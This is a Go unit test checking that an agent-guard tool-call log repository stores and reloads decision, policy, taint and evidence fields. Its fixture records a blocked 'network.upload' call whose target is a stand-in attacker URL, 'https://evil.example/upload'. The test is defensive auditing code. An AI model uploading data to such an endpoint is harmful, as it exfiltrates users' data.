package repository

import (
	"encoding/json"
	"testing"
)

func TestToolCallLogRoundTripsAgentGuardFields(t *testing.T) {
	db, ctx := setupRuntimeTruthTestDB(t)
	tenantID := "tenant-tool-agentguard"
	requestID := "req-tool-agentguard"

	repo := NewToolCallLogRepository(db)
	err := repo.Create(ctx, &ToolCallLog{
		RequestID:         requestID,
		SessionID:         "session-1",
		TenantID:          tenantID,
		UserID:            "user-1",
		ToolName:          "network.upload",
		ToolType:          "network",
		RiskLevel:         "critical",
		Parameters:        map[string]interface{}{"url": "https://evil.example/upload"},
		Status:            "blocked",
		RawDecision:       "confirm",
		EffectiveDecision: "block",
		Mode:              "strict",
		EffectiveReason:   "confirm_without_channel_fail_closed",
		PolicyVersion:     "policy-v1",
		TraceID:           "trace-1",
		Confidence:        0.91,
		EvidenceJSON:      json.RawMessage(`[{"rule_id":"argument_tainted"}]`),
		NormalizedTarget:  "https://evil.example/upload",
		Provenance:        "tainted",
		TaintedArguments:  json.RawMessage(`["url"]`),
	})
	if err != nil {
		t.Fatalf("create tool call log: %v", err)
	}

	logs, err := repo.ListByRequest(ctx, tenantID, requestID)
	if err != nil {
		t.Fatalf("list by request: %v", err)
	}
	if len(logs) != 1 {
		t.Fatalf("expected one log, got %d", len(logs))
	}
	log := logs[0]
	if log.RawDecision != "confirm" || log.EffectiveDecision != "block" || log.Mode != "strict" {
		t.Fatalf("decision fields did not round trip: %#v", log)
	}
	if log.PolicyVersion != "policy-v1" || log.TraceID != "trace-1" || log.Provenance != "tainted" {
		t.Fatalf("metadata fields did not round trip: %#v", log)
	}
	if string(log.EvidenceJSON) != `[{"rule_id": "argument_tainted"}]` && string(log.EvidenceJSON) != `[{"rule_id":"argument_tainted"}]` {
		t.Fatalf("unexpected evidence json: %s", string(log.EvidenceJSON))
	}
	if string(log.TaintedArguments) != `["url"]` {
		t.Fatalf("unexpected tainted arguments: %s", string(log.TaintedArguments))
	}
}
